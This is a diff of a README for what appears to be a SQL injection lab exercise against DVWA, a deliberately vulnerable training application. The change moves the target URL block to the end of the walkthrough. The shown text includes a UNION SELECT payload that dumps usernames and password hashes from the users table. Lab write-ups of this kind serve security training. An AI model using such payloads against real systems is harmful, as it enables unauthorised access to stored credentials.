@@ -27,10 +27,6 @@ SQLi-Simulation-DVWA/<br/>
 
 ## 💥 Attack Walkthrough
 
-### 🔹 Target URL:
-```http
-http://dvwa.structreuality.com/vulnerabilities/sqli/?id=#
-
 🔹 Steps Performed:
 Initial Request:
 
@@ -48,3 +44,8 @@ Credential Dump:
 
 Retrieved usernames and password hashes:
 ' UNION SELECT CONCAT(user, ' ', avatar), password FROM users#
+
+
+### 🔹 Target URL:
+```http
+http://dvwa.structreuality.com/vulnerabilities/sqli/?id=#
